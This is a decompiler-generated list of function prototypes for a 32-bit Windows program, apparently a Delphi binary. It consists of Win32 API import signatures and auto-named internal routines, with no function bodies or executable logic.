// DWORD __stdcall GetLastError_0();
// void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime);
// int __stdcall GetLocaleInfoA_0(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData);
// DWORD __stdcall GetModuleFileNameA_0(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleA_1(LPCSTR lpModuleName);
// DWORD __stdcall GetPrivateProfileStringA(LPCSTR lpAppName, LPCSTR lpKeyName, LPCSTR lpDefault, LPSTR lpReturnedString, DWORD nSize, LPCSTR lpFileName);
// FARPROC __stdcall GetProcAddress_0(HMODULE hModule, LPCSTR lpProcName);
// HANDLE __stdcall GetStdHandle_0(DWORD nStdHandle);
// BOOL __stdcall GetStringTypeExA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr, int cchSrc, LPWORD lpCharType);
// LCID __stdcall GetThreadLocale_0();
// DWORD __stdcall GetTickCount();
// BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation);
// UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize);
// HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes);
// HGLOBAL __stdcall GlobalFree(HGLOBAL hMem);
// LPVOID __stdcall GlobalLock(HGLOBAL hMem);
// HGLOBAL __stdcall GlobalHandle(LPCVOID pMem);
// HGLOBAL __stdcall GlobalReAlloc(HGLOBAL hMem, SIZE_T dwBytes, UINT uFlags);
// BOOL __stdcall GlobalUnlock(HGLOBAL hMem);
// void __stdcall InitializeCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall LeaveCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// int __stdcall MulDiv(int nNumber, int nNumerator, int nDenominator);
// HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// BOOL __stdcall ReadFile_0(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// BOOL __stdcall ResetEvent(HANDLE hEvent);
// BOOL __stdcall SetEndOfFile_0(HANDLE hFile);
// BOOL __stdcall SetEvent(HANDLE hEvent);
// BOOL __stdcall SetFileAttributesA(LPCSTR lpFileName, DWORD dwFileAttributes);
// DWORD __stdcall SetFilePointer_0(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// void __stdcall Sleep(DWORD dwMilliseconds);
// BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode);
// SIZE_T __stdcall VirtualQuery_0(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// UINT __stdcall WinExec(LPCSTR lpCmdLine, UINT uCmdShow);
// BOOL __stdcall WriteFile_0(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// HBITMAP __stdcall CreateBitmap(int nWidth, int nHeight, UINT nPlanes, UINT nBitCount, const void *lpBits);
// HBRUSH __stdcall CreateBrushIndirect(const LOGBRUSH *plbrush);
// HBITMAP __stdcall CreateCompatibleBitmap(HDC hdc, int cx, int cy);
// HDC __stdcall CreateCompatibleDC(HDC hdc);
// HBITMAP __stdcall CreateDIBitmap(HDC hdc, const BITMAPINFOHEADER *pbmih, DWORD flInit, const void *pjBits, const BITMAPINFO *pbmi, UINT iUsage);
// HFONT __stdcall CreateFontIndirectA(const LOGFONTA *lplf);
// HPALETTE __stdcall CreatePalette(const LOGPALETTE *plpal);
// HPEN __stdcall CreatePenIndirect(const LOGPEN *plpen);
// BOOL __stdcall DeleteDC(HDC hdc);
// BOOL __stdcall DeleteObject(HGDIOBJ ho);
// LONG __stdcall GetBitmapBits(HBITMAP hbit, LONG cb, LPVOID lpvBits);
// BOOL __stdcall GetCurrentPositionEx(HDC hdc, LPPOINT lppt);
// int __stdcall GetDIBits(HDC hdc, HBITMAP hbm, UINT start, UINT cLines, LPVOID lpvBits, LPBITMAPINFO lpbmi, UINT usage);
// int __stdcall GetDeviceCaps(HDC hdc, int index);
// int __stdcall GetObjectA(HANDLE h, int c, LPVOID pv);
// HGDIOBJ __stdcall GetStockObject(int i);
// UINT __stdcall GetSystemPaletteEntries(HDC hdc, UINT iStart, UINT cEntries, LPPALETTEENTRY pPalEntries);
// BOOL __stdcall GetTextMetricsA(HDC hdc, LPTEXTMETRICA lptm);
// BOOL __stdcall MoveToEx(HDC hdc, int x, int y, LPPOINT lppt);
// UINT __stdcall RealizePalette(HDC hdc);
// HGDIOBJ __stdcall SelectObject(HDC hdc, HGDIOBJ h);
// HPALETTE __stdcall SelectPalette(HDC hdc, HPALETTE hPal, BOOL bForceBkgd);
// COLORREF __stdcall SetBkColor(HDC hdc, COLORREF color);
// int __stdcall SetBkMode(HDC hdc, int mode);
// int __stdcall SetROP2(HDC hdc, int rop2);
// COLORREF __stdcall SetTextColor(HDC hdc, COLORREF color);
// BOOL __stdcall StretchBlt(HDC hdcDest, int xDest, int yDest, int wDest, int hDest, HDC hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, DWORD rop);
// BOOL __stdcall UnrealizeObject(HGDIOBJ h);
// LPSTR __stdcall CharNextA_0(LPCSTR lpsz);
// HICON __stdcall CopyIcon(HICON hIcon);
// HICON __stdcall CreateIcon(HINSTANCE hInstance, int nWidth, int nHeight, BYTE cPlanes, BYTE cBitsPixel, const BYTE *lpbANDbits, const BYTE *lpbXORbits);
// HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// LRESULT __stdcall DefWindowProcA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL __stdcall DestroyIcon(HICON hIcon);
// LRESULT __stdcall DispatchMessageA(const MSG *lpMsg);
// BOOL __stdcall DrawIconEx(HDC hdc, int xLeft, int yTop, HICON hIcon, int cxWidth, int cyWidth, UINT istepIfAniCur, HBRUSH hbrFlickerFreeDraw, UINT diFlags);
// HWND __stdcall FindWindowA(LPCSTR lpClassName, LPCSTR lpWindowName);
// HWND __stdcall FindWindowExA(HWND hWndParent, HWND hWndChildAfter, LPCSTR lpszClass, LPCSTR lpszWindow);
// int __stdcall GetClassNameA(HWND hWnd, LPSTR lpClassName, int nMaxCount);
// BOOL __stdcall GetCursorPos(LPPOINT lpPoint);
// HDC __stdcall GetDC(HWND hWnd);
// HWND __stdcall GetDesktopWindow();
// HWND __stdcall GetFocus();
// HWND __stdcall GetForegroundWindow();
// BOOL __stdcall GetIconInfo(HICON hIcon, PICONINFO piconinfo);
// BOOL __stdcall GetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// DWORD __stdcall GetSysColor(int nIndex);
// int __stdcall GetSystemMetrics(int nIndex);
// int __stdcall GetWindowTextA(HWND hWnd, LPSTR lpString, int nMaxCount);
// DWORD __stdcall GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId);
// BOOL __stdcall IsWindowVisible(HWND hWnd);
// HCURSOR __stdcall LoadCursorA(HINSTANCE hInstance, LPCSTR lpCursorName);
// HICON __stdcall LoadIconA(HINSTANCE hInstance, LPCSTR lpIconName);
// int __stdcall LoadStringA_0(HINSTANCE hInstance, UINT uID, LPSTR lpBuffer, int cchBufferMax);
// int __stdcall MessageBoxA_0(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// BOOL __stdcall PeekMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
// BOOL __stdcall PtInRect(const RECT *lprc, POINT pt);
// ATOM __stdcall RegisterClassA(const WNDCLASSA *lpWndClass);
// int __stdcall ReleaseDC(HWND hWnd, HDC hDC);
// LRESULT __stdcall SendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// UINT_PTR __stdcall SetTimer(HWND hWnd, UINT_PTR nIDEvent, UINT uElapse, TIMERPROC lpTimerFunc);
// HHOOK __stdcall SetWindowsHookExA(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
// BOOL __stdcall ShowWindow(HWND hWnd, int nCmdShow);
// BOOL __stdcall TranslateMessage(const MSG *lpMsg);
// BOOL __stdcall UnhookWindowsHookEx(HHOOK hhk);
// LPVOID __usercall sub_406ACC@<eax>(UINT a1@<eax>, SIZE_T a2@<edx>);
// LPVOID __usercall sub_406ADC@<eax>(UINT uFlags@<ecx>, SIZE_T dwBytes@<edx>, const void *a3@<eax>);
// HGLOBAL __usercall sub_406AF8@<eax>(const void *a1@<eax>);
int sub_406B0C();
void sub_406B3C();
int sub_406DD4();
void sub_406E04();
int __fastcall sub_4079D8(_DWORD, _DWORD); // weak
// char *__usercall sub_4079FC@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_407A1C@<eax>(int a1@<eax>, char **a2@<edx>);
// int __usercall sub_407A58@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>, unsigned int a3@<ecx>);
// int __usercall sub_407A78@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>);
// char __usercall sub_407ACC@<al>(_BYTE *a1@<eax>, _BYTE *a2@<edx>);
// int __usercall sub_407AF0@<eax>(char *a1@<eax>, char *a2@<edx>);
// int __usercall sub_407B28@<eax>(char *a1@<eax>, char *a2@<edx>);
// int __usercall sub_407B60@<eax>(_BYTE *a1@<eax>);
// _DWORD *__usercall sub_407BC4@<eax>(int a1@<eax>, char **a2@<edx>);
// _DWORD *__userpurge sub_407BF4@<eax>(char **a1@<eax>, char a2, int a3);
// int __usercall Delphi_StrToInt_407C28@<eax>(int a1@<eax>);
// int __usercall sub_407C64@<eax>(int a1@<eax>, int a2@<edx>, char *a3@<ecx>);
// __int64 __usercall sub_407C7C@<edx:eax>(int a1@<eax>);
// int __usercall sub_407CD8@<eax>(char *a1@<eax>, char a2@<dl>);
// HANDLE __usercall sub_407D34@<eax>(char *a1@<eax>);
// HANDLE __usercall sub_407D58@<eax>(char *a1@<eax>);
// DWORD __usercall sub_407D60@<eax>(DWORD nNumberOfBytesToRead@<ecx>, LPVOID lpBuffer@<edx>, void *a3@<eax>);
// DWORD __usercall sub_407D8C@<eax>(DWORD nNumberOfBytesToWrite@<ecx>, LPCVOID lpBuffer@<edx>, void *a3@<eax>);
// DWORD __userpurge sub_407DB8@<eax>(void *a1@<eax>, DWORD a2@<edx>, LONG a3, LONG a4);
// BOOL __usercall sub_407DF0@<eax>(void *a1@<eax>);
// DWORD __usercall sub_407DF8@<eax>(char *a1@<eax>, DWORD a2@<edx>);
// DWORD __usercall sub_407E20@<eax>(int a1@<eax>);
// DWORD __usercall sub_407E84@<eax>(char *a1@<eax>, char a2@<dl>, int a3@<ecx>);
// DWORD __usercall sub_407ED4@<eax>(int a1@<eax>);
// void *__usercall sub_407EF8@<eax>(int a1@<eax>);
// BOOL __usercall sub_407F14@<eax>(char *a1@<eax>);
// int __usercall sub_407F2C@<eax>(char *a1@<eax>, char *a2@<edx>);
// _DWORD *__usercall sub_407F7C@<eax>(char *a1@<eax>, char *a2@<edx>, volatile __int32 *a3@<ecx>);
// _DWORD *__usercall sub_408010@<eax>(char *a1@<eax>, char **a2@<edx>);
// _DWORD *__usercall sub_408044@<eax>(char *a1@<eax>, char **a2@<edx>);
BOOL __stdcall sub_40807C(LPCSTR lpRootPathName, int *a2, int *a3, int a4);
// unsigned int __usercall sub_4080F0@<eax>(const char *a1@<eax>);
// char *__usercall sub_408108@<eax>(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>);
// char *__usercall sub_408118@<eax>(char *result@<eax>, _BYTE *a2@<edx>, int a3@<ecx>);
// char *__usercall sub_40814C@<eax>(char *a1@<eax>, char *a2@<edx>);
// int __usercall sub_408170@<eax>(_BYTE *a1@<eax>, const char *a2@<edx>);
// int __usercall sub_408194@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>, int a3@<ecx>);
// _BYTE *__usercall sub_4081D8@<eax>(_BYTE *a1@<eax>, unsigned __int8 a2@<dl>);
// const char *__usercall sub_4081F8@<eax>(const char *a1@<eax>, const char *a2@<edx>);
// _DWORD *__usercall sub_40824C@<eax>(int a1@<eax>);
// char *__usercall sub_408260@<eax>(char *a1@<eax>);
int __fastcall sub_40828C(unsigned int a1, unsigned __int8 *a2);
int __fastcall sub_4082E4(int a1, int a2);
// _DWORD *__usercall sub_4082F8@<eax>(_DWORD *a1@<eax>);
// unsigned __int8 *__userpurge sub_408304@<eax>(int a1@<eax>, unsigned int a2@<edx>, unsigned __int8 *a3@<ecx>, int a4, int a5, int a6);
// unsigned __int8 __usercall sub_4083E6@<al>(unsigned __int8 result@<al>, unsigned __int8 *a2@<ecx>, int a3@<ebp>, unsigned __int8 *a4@<esi>);
// char __usercall sub_40842E@<al>(char a1@<al>, int a2@<ebp>, int a3@<esi>);
// int __usercall sub_4084F1@<eax>(int a1@<ebx>, int a2@<ebp>);
// unsigned int __usercall sub_408582@<eax>(unsigned int result@<eax>, int a2@<ebp>);
// void __usercall __spoils<edx,ecx> sub_4086F8(int a1@<ebp>);
// int __userpurge sub_408718@<eax>(int a1@<eax>, unsigned int a2@<edx>, char *a3@<ecx>, int a4, int a5);
// _DWORD *__userpurge sub_408758@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, char **a4);
// _DWORD *__userpurge sub_40876C@<eax>(char **a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
// int __usercall sub_40882C@<eax>(__int16 a1@<ax>, int a2@<edx>, int a3@<ecx>, char a4@<bl>, _BYTE *a5@<edi>);
// int __userpurge sub_408870@<eax>(_BYTE *a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5, unsigned __int8 a6);
int sub_408960(); // weak
// char __usercall sub_408966@<al>(char *a1@<esi>);
// char __usercall sub_40896F@<al>(int a1@<ebp>, _BYTE *a2@<edi>);
// char __usercall sub_408979@<al>(int a1@<ebp>, char *a2@<edi>, char *a3@<esi>);
// char __usercall sub_408A0E@<al>(int a1@<ebp>, char *a2@<edi>, char *a3@<esi>);
// void __usercall sub_408A78(int a1@<ebp>, _BYTE *a2@<edi>);
// void __usercall sub_408ACC(int a1@<ebp>, void *a2@<edi>);
// void __usercall sub_408ADB(int a1@<eax>, _BYTE *a2@<edx>, _BYTE *a3@<ecx>, int a4@<ebp>);
// _BYTE *__userpurge sub_408B48@<eax>(int a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5);
// int __usercall sub_408B75@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<esi>);
// _BYTE *__usercall sub_408C97@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<esi>);
// _DWORD *__usercall sub_408D74@<eax>(DWORD a1@<eax>, char **a2@<edx>);
// volatile __int32 *__userpurge sub_408DC0@<eax>(LCID a1@<eax>, LCTYPE a2@<edx>, __int32 a3@<ecx>, volatile __int32 *a4);
// int __usercall sub_408E0C@<eax>(LCID a1@<eax>, LCTYPE a2@<edx>, int a3@<ecx>);
// int **__userpurge sub_408E34@<eax>(LCTYPE a1@<eax>, int a2@<edx>, int a3@<ecx>, volatile __int32 *a4, int a5, int a6);
// int __usercall sub_408E70@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
BOOL __stdcall CalInfoEnumProc(LPSTR a1); // idb
BOOL __stdcall sub_408FD0(LPSTR a1); // idb
_DWORD *sub_409048();
// int __usercall sub_4090F8@<eax>(char *a1@<eax>, char **a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// int __usercall sub_409320@<eax>(int result@<eax>);
// unsigned int __userpurge sub_40932C@<eax>(int a1@<eax>, const void *a2@<edx>, const char *a3@<ecx>, unsigned int a4);
// int __usercall sub_4094B4@<eax>(int a1@<eax>, const void *a2@<edx>);
// _DWORD *__usercall sub_409568@<eax>(int a1@<eax>, char a2@<dl>, __int32 a3@<ecx>);
// int __userpurge sub_4095A4@<eax>(int a1@<eax>, char a2@<dl>, int a3@<ecx>, int a4, int a5);
// _DWORD *__usercall sub_409624@<eax>(int a1@<eax>, char a2@<dl>, int **a3@<ecx>);
// int __userpurge sub_409660@<eax>(int a1@<eax>, char a2@<dl>, int **a3@<ecx>, int a4, int a5);
// int __usercall sub_4096F4@<eax>(int result@<eax>);
_DWORD *sub_409720();
// int __usercall sub_4097A0@<eax>(unsigned __int8 a1@<al>, int a2, int a3, int a4, int a5);
// int __usercall sub_4097F4@<eax>(__int32 a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_4098A0@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5);
_DWORD __stdcall sub_4098B0(_DWORD); // weak
int sub_4098CC(); // weak
// char __usercall sub_4098E4@<al>(int *a1@<eax>);
// int __usercall sub_409964@<eax>(int *a1@<eax>);
int __cdecl sub_40997C(int a1);
// int *__usercall sub_409B48@<eax>(int *a1@<eax>);
int (*sub_409C24())();
void *sub_409CA8();
_DWORD *sub_409D14();
// int __usercall sub_409D6C@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>);
// int __usercall sub_409DE4@<eax>(char *a1@<eax>, int a2@<edx>);
// int __usercall sub_409E08@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>);
// int __usercall sub_409E20@<eax>(const CHAR *a1@<eax>);
// int __usercall sub_409E40@<eax>(char *a1@<eax>, int a2@<edx>);
// int __usercall sub_409E7C@<eax>(char *a1@<eax>, char *a2@<edx>);
// const char *__usercall sub_409EB4@<eax>(char *a1@<eax>, const char *a2@<edx>);
// _BYTE *__usercall sub_409F54@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 a2@<dl>);
// _BYTE *__usercall sub_409F7C@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 a2@<dl>);
// int __usercall sub_409FBC@<eax>(LCID a1@<eax>);
unsigned __int8 __cdecl sub_40A030(int a1);
unsigned __int8 sub_40A090();
char sub_40A0A8();
// int __usercall sub_40A21C@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// void __stdcall Sleep_0(DWORD dwMilliseconds);
_DWORD *sub_40A59C();
// int __usercall sub_40A638@<eax>(int a1@<eax>);
int sub_40A648();
HMODULE sub_40A668();
// signed __int32 __usercall sub_40A6C4@<eax>(volatile signed __int32 *a1@<eax>);
// signed __int32 __usercall sub_40A6D0@<eax>(volatile signed __int32 *a1@<eax>);
// __int32 __usercall sub_40A6DC@<eax>(volatile __int32 *a1@<eax>, __int32 a2@<edx>);
// signed __int32 __usercall sub_40A6E4@<eax>(volatile signed __int32 *a1@<eax>, unsigned int a2@<edx>);
// _DWORD *__usercall sub_40A6EC@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_40A728@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
char sub_40A790();
// _DWORD *__usercall sub_40A7A8@<eax>(__int32 a1@<eax>, _DWORD *a2@<edx>);
// _DWORD *__usercall sub_40A820@<eax>(__int32 a1@<eax>, _DWORD *a2@<edx>);
// __int32 __usercall sub_40A8A8@<eax>(int a1@<eax>, __int32 **a2@<edx>);
// __int32 __usercall sub_40A8F0@<eax>(__int32 result@<eax>, __int32 a2@<edx>);
// __int32 __usercall sub_40A91C@<eax>(__int32 a1@<eax>);
// _DWORD *__usercall sub_40A974@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_40A9E8@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// BOOL __usercall sub_40AA30@<eax>(int a1@<eax>);
// BOOL __usercall sub_40AA3C@<eax>(int a1@<eax>);
// BOOL __usercall sub_40AA48@<eax>(int a1@<eax>);
// DWORD __usercall sub_40AA54@<eax>(int a1@<eax>);
// DWORD __usercall sub_40AA64@<eax>(int a1@<eax>);
// int __usercall sub_40AA74@<eax>(int a1@<eax>, int a2@<ebx>);
// _DWORD *__usercall sub_40AB74@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_40AC18@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_40ACBC@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_40AD4C@<eax>(_DWORD **a1@<eax>);
// BOOL __usercall sub_40AD5C@<eax>(int (__stdcall ***a1)(_DWORD, int, int)@<eax>, int a2@<edx>, int a3@<ecx>);
// _DWORD *__usercall sub_40AD80@<eax>(int *a1@<eax>, _DWORD *a2@<edx>, _DWORD *a3@<ecx>);
int sub_40B0E8();
// int __usercall sub_40B268@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
bool sub_40B2E8();
// int __usercall sub_40B564@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_40B584@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_40B5A4@<eax>(int a1@<eax>, int a2@<edx>);
int sub_40B5C4();
void sub_40B5F4();
char sub_40B5FC();
// int __usercall sub_40B968@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __userpurge sub_40B98C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
// int __userpurge sub_40B9BC@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
// int __userpurge sub_40B9EC@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
// int __userpurge sub_40BA1C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
int sub_40BA4C();
void sub_40BA7C();
int sub_40BC60();
void sub_40BD10();
int sub_40BD18();
void sub_40BD48();
HMODULE sub_40BD50();
BOOL sub_40BEA8();
int sub_40BEC0();
void sub_40BEF0();
HMODULE sub_40BFB4();
// HWND __usercall sub_40C054@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>);
// _DWORD *__usercall sub_40C1CC@<eax>(int a1@<eax>, char **a2@<edx>, int a3@<esi>);
// _DWORD *__usercall sub_40C214@<eax>(int a1@<eax>, char **a2@<edx>);
// _DWORD *__usercall sub_40C250@<eax>(int a1@<eax>, char **a2@<edx>);
// int __usercall sub_40C28C@<eax>(char *a1@<eax>);
// bool __usercall sub_40C2F4@<al>(char *a1@<eax>);
// DWORD __usercall sub_40C304@<eax>(DWORD nNumberOfBytesToRead@<ecx>, LPVOID lpBuffer@<edx>, void *a3@<eax>);
// DWORD __usercall sub_40C330@<eax>(DWORD nNumberOfBytesToWrite@<ecx>, LPCVOID lpBuffer@<edx>, void *a3@<eax>);
// BOOL __usercall sub_40C35C@<eax>(void *a1@<eax>);
// DWORD __usercall sub_40C364@<eax>(DWORD dwMoveMethod@<ecx>, LONG lDistanceToMove@<edx>, void *a3@<eax>);
// HANDLE __usercall sub_40C370@<eax>(char *a1@<eax>);
// int __usercall sub_40C394@<eax>(char *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_40C3F0@<eax>(char *a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>);
// int __usercall sub_40C51C@<eax>(volatile __int32 *a1@<eax>);
// int __usercall sub_40C610@<eax>(int a1@<eax>, char *a2@<ecx>);
// unsigned int __usercall sub_40C61C@<eax>(const char *a1@<eax>);
// char *__usercall sub_40C634@<eax>(char *result@<eax>, const char *a2@<edx>);
// _DWORD *__usercall sub_40C65C@<eax>(char *a1@<eax>, char **a2@<edx>);
// _DWORD *__usercall sub_40C670@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>);
// bool __usercall sub_40C6EC@<al>(HINSTANCE a1@<eax>, int a2@<edx>);
// int __usercall sub_40C728@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>);
// int __usercall sub_40C79C@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>);
// char *__usercall sub_40C7B0@<eax>(int a1@<eax>);
int __thiscall nullsub_1(_DWORD); // weak
// _DWORD *__usercall sub_40C7D4@<eax>(_DWORD *a1@<eax>);
int __fastcall sub_40C7E0(int a1, int a2);
void __stdcall sub_40C7F4(int a1, int a2, int a3);
// unsigned __int8 *__userpurge sub_40C7FC@<eax>(int a1@<eax>, unsigned int a2@<edx>, unsigned __int8 *a3@<ecx>, int a4, int a5, int a6);
// unsigned __int8 __usercall sub_40C8DE@<al>(unsigned __int8 result@<al>, unsigned __int8 *a2@<ecx>, int a3@<ebp>, unsigned __int8 *a4@<esi>);
// void __usercall sub_40C926(char a1@<al>, int a2@<ebp>, int a3@<esi>);
// int __usercall sub_40C9E9@<eax>(int a1@<ebx>, int a2@<ebp>);
// unsigned int __usercall sub_40CA7A@<eax>(unsigned int result@<eax>, int a2@<ebp>);
// void __usercall __spoils<edx,ecx> sub_40CBF0(int a1@<ebp>);
// _DWORD *__userpurge sub_40CC10@<eax>(char **a1@<eax>, unsigned __int8 *a2@<edx>, int a3@<ecx>, int a4);
// _DWORD *__userpurge sub_40CCD0@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>, int a3@<ecx>, char **a4);
// __int64 __usercall sub_40CCE4@<edx:eax>(char *a1@<eax>);
int sub_40CE30();
// int __usercall sub_40D0BC@<eax>(int a1@<eax>);
// int __usercall sub_40D23C@<eax>(char **a1@<eax>);
// _DWORD *__userpurge sub_40D2A4@<eax>(char *a1@<eax>, char *a2@<edx>, char *a3@<ecx>, char **a4, char *a5);
// char **__usercall sub_40D304@<eax>(char **a1@<eax>);
// _DWORD *__usercall sub_40D35C@<eax>(int a1@<eax>, char **a2@<edx>, int a3@<esi>);
int sub_40D394();
// int __usercall sub_40D3D8@<eax>(int a1@<eax>, char **a2@<edx>);
int sub_40D564();
// int __usercall sub_40D648@<eax>(unsigned __int8 a1@<al>);
// char __userpurge sub_40D6FC@<al>(int a1@<eax>, int a2@<ecx>, volatile __int32 *a3);
// char __usercall sub_40D8C8@<al>(int a1@<eax>, volatile __int32 *a2@<edx>);
// int __usercall sub_40D9C8@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>);
// _DWORD *__userpurge sub_40DA30@<eax>(int a1@<eax>, char **a2@<edx>, char a3, int a4);
// int __usercall sub_40DA70@<eax>(int a1@<eax>, char a2@<dl>, volatile __int32 *a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>);
// int __usercall sub_40DB58@<eax>(int a1@<eax>, _BYTE *a2@<edx>);
// int __usercall sub_40DC74@<eax>(int a1@<esi>);
// _DWORD *__usercall sub_40E348@<eax>(int a1@<eax>, char **a2@<edx>);
// _DWORD *__usercall sub_40E3C8@<eax>(char **a1@<eax>);
// _DWORD *__usercall sub_40E3DC@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_40E428@<eax>(int a1@<eax>, char **a2@<edx>);
// volatile __int32 *__usercall sub_40E440@<eax>(__int32 *a1@<eax>);
// int __usercall sub_40E46C@<eax>(int a1@<eax>);
// int __userpurge sub_40E49C@<eax>(int a1@<eax>, __int32 a2@<edx>, __int32 a3@<ecx>, char a4);
int sub_40E528();
void sub_40E62C();
// __int64 __usercall sub_40E634@<edx:eax>(HKEY a1@<eax>, const CHAR *a2@<edx>);
// HKEY __usercall sub_40E660@<eax>(HKEY a1@<eax>, const CHAR *a2@<edx>);
// _DWORD *__userpurge sub_40E67C@<eax>(HKEY a1@<eax>, const CHAR *a2@<edx>, const CHAR *a3@<ecx>, int a4, BYTE *lpData);
// LSTATUS __usercall sub_40E6F4@<eax>(LPCSTR lpValueName@<ecx>, HKEY a2@<eax>, const CHAR *a3@<edx>);
// int __usercall sub_40E710@<eax>(HKEY a1@<eax>, char *a2@<edx>, const CHAR *a3@<ecx>);
// LSTATUS __userpurge sub_40E8D0@<eax>(HKEY a1@<eax>, const CHAR *a2@<edx>, const CHAR *a3@<ecx>, char **a4);
// int __usercall sub_40E944@<eax>(LPCSTR lpValueName@<ecx>, HKEY a2@<eax>, const CHAR *a3@<edx>, int a4@<ebx>);
// char *__usercall sub_40E97C@<eax>(HKEY a1@<eax>, char *a2@<edx>, char *a3@<ecx>);
// DWORD __usercall sub_40EA60@<eax>(HKEY a1@<eax>, const CHAR *a2@<edx>, volatile __int32 *a3@<ecx>);
int sub_40EB64();
void sub_40EB94();
// int __stdcall closesocket(SOCKET s);
// int __stdcall connect(SOCKET s, const struct sockaddr *name, int namelen);
// u_short __stdcall htons(u_short hostshort);
// char *__stdcall inet_ntoa(struct in_addr in);
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// SOCKET __stdcall socket(int af, int type, int protocol);
// struct hostent *__stdcall gethostbyname(const char *name);
// int __stdcall gethostname(char *name, int namelen);
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// int __stdcall WSACleanup();
int sub_40EBF4();
void sub_40EC24();
// struct hostent *__usercall sub_40EC2C@<eax>(char **a1@<eax>);
// int __usercall sub_40EC94@<eax>(HKEY a1@<eax>, char *a2@<edx>);
// int __usercall sub_40EDE0@<eax>(HKEY a1@<eax>, CHAR *a2@<edx>, __int32 a3@<ecx>);
// int __usercall sub_40F6C0@<eax>(volatile __int32 *a1@<eax>, int a2@<ebx>);
